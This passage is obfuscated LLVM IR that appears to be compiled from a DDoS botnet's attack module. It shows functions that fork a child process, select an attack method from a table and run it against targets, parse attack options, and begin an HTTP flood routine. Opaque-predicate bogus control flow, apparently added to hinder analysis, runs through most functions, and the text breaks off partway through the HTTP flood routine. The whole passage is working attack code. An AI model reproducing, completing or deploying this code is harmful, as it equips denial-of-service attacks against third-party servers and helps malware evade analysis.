  call void @attack_start(i32 %341, i8 zeroext %342, i8 zeroext %343, %struct.attack_target* %344, i8 zeroext %345, %struct.attack_option* %346)
  br label %347

; <label>:347:                                    ; preds = %339, %289, %276, %originalBBpart235, %217, %141, %originalBBpart217, %73, %originalBBpart24, %32
  %348 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %349 = icmp ne %struct.attack_target* %348, null
  br i1 %349, label %350, label %353

; <label>:350:                                    ; preds = %347
  %351 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %352 = bitcast %struct.attack_target* %351 to i8*
  call void @free(i8* %352) #6
  br label %353

; <label>:353:                                    ; preds = %350, %347
  %354 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %355 = icmp ne %struct.attack_option* %354, null
  br i1 %355, label %356, label %360

; <label>:356:                                    ; preds = %353
  %357 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %358 = load i8, i8* %17, align 1
  %359 = zext i8 %358 to i32
  call void @free_opts(%struct.attack_option* %357, i32 %359)
  br label %360

; <label>:360:                                    ; preds = %356, %353
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %361 = alloca i8*, align 8
  %362 = alloca i32, align 4
  %363 = alloca i32, align 4
  %364 = alloca i32, align 4
  %365 = alloca i8, align 1
  %366 = alloca i8, align 1
  %367 = alloca i8, align 1
  %368 = alloca %struct.attack_target*, align 8
  %369 = alloca %struct.attack_option*, align 8
  %370 = alloca i8, align 1
  store i8* %0, i8** %361, align 8
  store i32 %1, i32* %362, align 4
  store i32 0, i32* %363, align 4
  store %struct.attack_target* null, %struct.attack_target** %368, align 8
  store %struct.attack_option* null, %struct.attack_option** %369, align 8
  %371 = load i32, i32* %362, align 4
  %372 = sext i32 %371 to i64
  %373 = icmp ult i64 %372, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %374 = load i8*, i8** %11, align 8
  %375 = getelementptr inbounds i8, i8* %374, i32 1
  store i8* %375, i8** %11, align 8
  %376 = load i8, i8* %374, align 1
  store i8 %376, i8* %16, align 1
  %377 = load i32, i32* %12, align 4
  %378 = sext i32 %377 to i64
  %_ = sub i64 %378, 1
  %gen = mul i64 %_, 1
  %_7 = sub i64 %378, 1
  %gen8 = mul i64 %_7, 1
  %_9 = sub i64 %378, 1
  %gen10 = mul i64 %_9, 1
  %_11 = shl i64 %378, 1
  %379 = sub i64 %378, 1
  %380 = trunc i64 %379 to i32
  store i32 %380, i32* %12, align 4
  %381 = load i8, i8* %16, align 1
  %382 = zext i8 %381 to i32
  %383 = icmp eq i32 %382, 0
  br label %originalBB6

originalBB15alteredBB:                            ; preds = %originalBB15, %101
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %118
  %384 = load i32, i32* %12, align 4
  %385 = sext i32 %384 to i64
  %386 = load i8, i8* %16, align 1
  %387 = zext i8 %386 to i64
  %_20 = sub i64 5, %387
  %gen21 = mul i64 %_20, %387
  %_22 = sub i64 0, 5
  %gen23 = add i64 %_22, %387
  %_24 = shl i64 5, %387
  %_25 = shl i64 5, %387
  %388 = mul i64 5, %387
  %389 = icmp ult i64 %385, %388
  br label %originalBB19

originalBB29alteredBB:                            ; preds = %originalBB29, %197
  %390 = load i32, i32* %12, align 4
  %391 = sext i32 %390 to i64
  %392 = icmp ult i64 %391, 1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %243
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %319
  %393 = load i32, i32* %13, align 4
  %_38 = sub i32 0, %393
  %gen39 = add i32 %_38, 1
  %_40 = shl i32 %393, 1
  %_41 = shl i32 %393, 1
  %394 = add nsw i32 %393, 1
  store i32 %394, i32* %13, align 4
  br label %originalBB37
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %37, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* @x.7
  %20 = load i32, i32* @y.8
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %13, align 4
  %28 = icmp eq i32 %27, -1
  %29 = load i32, i32* @x.7
  %30 = load i32, i32* @y.8
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %38

; <label>:37:                                     ; preds = %originalBBpart2, %6
  ret void

; <label>:38:                                     ; preds = %originalBBpart2
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %39

; <label>:39:                                     ; preds = %70, %38
  %40 = load i32, i32* %14, align 4
  %41 = load i8, i8* @methods_len, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp slt i32 %40, %42
  br i1 %43, label %44, label %73

; <label>:44:                                     ; preds = %39
  %45 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %46 = load i32, i32* %14, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %45, i64 %47
  %49 = load %struct.attack_method*, %struct.attack_method** %48, align 8
  %50 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %49, i32 0, i32 1
  %51 = load i8, i8* %50, align 8
  %52 = zext i8 %51 to i32
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %52, %54
  br i1 %55, label %56, label %69

; <label>:56:                                     ; preds = %44
  %57 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %58 = load i32, i32* %14, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %57, i64 %59
  %61 = load %struct.attack_method*, %struct.attack_method** %60, align 8
  %62 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %61, i32 0, i32 0
  %63 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %62, align 8
  %64 = load i32, i32* %7, align 4
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %67 = load i8, i8* %11, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %63(i32 %64, i8 zeroext %65, %struct.attack_target* %66, i8 zeroext %67, %struct.attack_option* %68)
  br label %73

; <label>:69:                                     ; preds = %44
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %14, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %14, align 4
  br label %39

; <label>:73:                                     ; preds = %56, %39
  %74 = load i32, i32* @x.7
  %75 = load i32, i32* @y.8
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  call void @exit(i32 0) #8
  %82 = load i32, i32* @x.7
  %83 = load i32, i32* @y.8
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %18
  %90 = load i32, i32* %13, align 4
  %91 = icmp eq i32 %90, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  call void @exit(i32 0) #8
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %116

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %94, %9
  %11 = load i32, i32* @x.9
  %12 = load i32, i32* @y.10
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %19, %20
  %22 = load i32, i32* @x.9
  %23 = load i32, i32* @y.10
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %97

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i32, i32* @x.9
  %32 = load i32, i32* @y.10
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %39, i64 %41
  %43 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %42, i32 0, i32 0
  %44 = load i8*, i8** %43, align 8
  %45 = icmp ne i8* %44, null
  %46 = load i32, i32* @x.9
  %47 = load i32, i32* @y.10
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %77

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i32, i32* @x.9
  %56 = load i32, i32* @y.10
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  %63 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %63, i64 %65
  %67 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %66, i32 0, i32 0
  %68 = load i8*, i8** %67, align 8
  call void @free(i8* %68) #6
  %69 = load i32, i32* @x.9
  %70 = load i32, i32* @y.10
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %77

; <label>:77:                                     ; preds = %originalBBpart28, %originalBBpart24
  %78 = load i32, i32* @x.9
  %79 = load i32, i32* @y.10
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %77
  %86 = load i32, i32* @x.9
  %87 = load i32, i32* @y.10
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %94

; <label>:94:                                     ; preds = %originalBBpart212
  %95 = load i32, i32* %5, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %5, align 4
  br label %10

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* @x.9
  %99 = load i32, i32* @y.10
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %97
  %106 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %107 = bitcast %struct.attack_option* %106 to i8*
  call void @free(i8* %107) #6
  %108 = load i32, i32* @x.9
  %109 = load i32, i32* @y.10
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %116

; <label>:116:                                    ; preds = %originalBBpart216, %8
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %117 = load i32, i32* %5, align 4
  %118 = load i32, i32* %4, align 4
  %119 = icmp slt i32 %117, %118
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %120 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %121 = load i32, i32* %5, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %120, i64 %122
  %124 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %123, i32 0, i32 0
  %125 = load i8*, i8** %124, align 8
  %126 = icmp ne i8* %125, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  %127 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %128 = load i32, i32* %5, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %127, i64 %129
  %131 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %130, i32 0, i32 0
  %132 = load i8*, i8** %131, align 8
  call void @free(i8* %132) #6
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %77
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %97
  %133 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %134 = bitcast %struct.attack_option* %133 to i8*
  call void @free(i8* %134) #6
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %67, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %70

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* @x.11
  %18 = load i32, i32* @y.12
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %25, i64 %27
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i32 0, i32 1
  %30 = load i8, i8* %29, align 8
  %31 = zext i8 %30 to i32
  %32 = load i8, i8* %8, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %31, %33
  %35 = load i32, i32* @x.11
  %36 = load i32, i32* @y.12
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %66

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* @x.11
  %45 = load i32, i32* @y.12
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %53 = load i32, i32* %10, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %52, i64 %54
  %56 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %55, i32 0, i32 0
  %57 = load i8*, i8** %56, align 8
  store i8* %57, i8** %5, align 8
  %58 = load i32, i32* @x.11
  %59 = load i32, i32* @y.12
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %72

; <label>:66:                                     ; preds = %originalBBpart2
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %10, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %10, align 4
  br label %11

; <label>:70:                                     ; preds = %11
  %71 = load i8*, i8** %9, align 8
  store i8* %71, i8** %5, align 8
  br label %72

; <label>:72:                                     ; preds = %70, %originalBBpart24
  %73 = load i8*, i8** %5, align 8
  ret i8* %73

originalBBalteredBB:                              ; preds = %originalBB, %16
  %74 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %75 = load i32, i32* %10, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %74, i64 %76
  %78 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %77, i32 0, i32 1
  %79 = load i8, i8* %78, align 8
  %80 = zext i8 %79 to i32
  %81 = load i8, i8* %8, align 1
  %82 = zext i8 %81 to i32
  %83 = icmp eq i32 %80, %82
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %84 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %85 = load i32, i32* %10, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %87, i32 0, i32 0
  %89 = load i8*, i8** %88, align 8
  store i8* %89, i8** %5, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 20, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 23, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %4045

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %4045

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %4045

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %4045

; <label>:105:                                    ; preds = %100
  %106 = load i32, i32* @x.17
  %107 = load i32, i32* @y.18
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %105
  store i32 0, i32* %10, align 4
  %114 = load i32, i32* @x.17
